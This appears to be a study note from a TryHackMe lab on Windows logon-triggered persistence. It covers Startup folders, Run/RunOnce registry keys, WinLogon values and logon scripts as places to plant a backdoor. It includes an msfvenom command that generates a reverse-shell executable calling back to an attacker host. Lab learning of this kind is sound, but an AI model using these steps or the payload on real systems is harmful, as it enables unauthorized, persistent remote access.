# Windows Persistence - Logon Triggered

## Startup Folder

Each user has a:
- `C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\`
To force all users to run a payload user: 
- `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\`

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$attack_ip LPORT=$port -f exe -o revshell.exe
```
Transfer to target machine and copy to one of the above locations.

## Run / RunOnce
Instead of a directory you can modify the registery entries to specify application to run at logon:
-   `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
-   `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
-   `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
-   `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`

`Right-Click -> New -> Expandable String Value`
Name it, set type to `REG_EXPAND_SZ` and data as path to reverse shell.

## WinLogon

WinLogon loads user profiles after authenication, it uses registry keys under: 
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\` - change either of the below:
	- `Userinit` points to `userinit.exe`
	- `Shell` points to a system shell

## Logon Scripts

`userinit.exe` while loading a user profile checks the environment variable called `UserInitMprLogonScript`. It is `HKCU` defined and must configured for each user that you require to have backdoor to. 
- `HKCU\Environment` - Parent key to make the subkey under:
	- `UserInitMprLogonScript`; `REG_EXPAND_SZ`; `Path to backdoor`

## References

[THM Windows Persistence Room](https://tryhackme.com/room/windowslocalpersistence)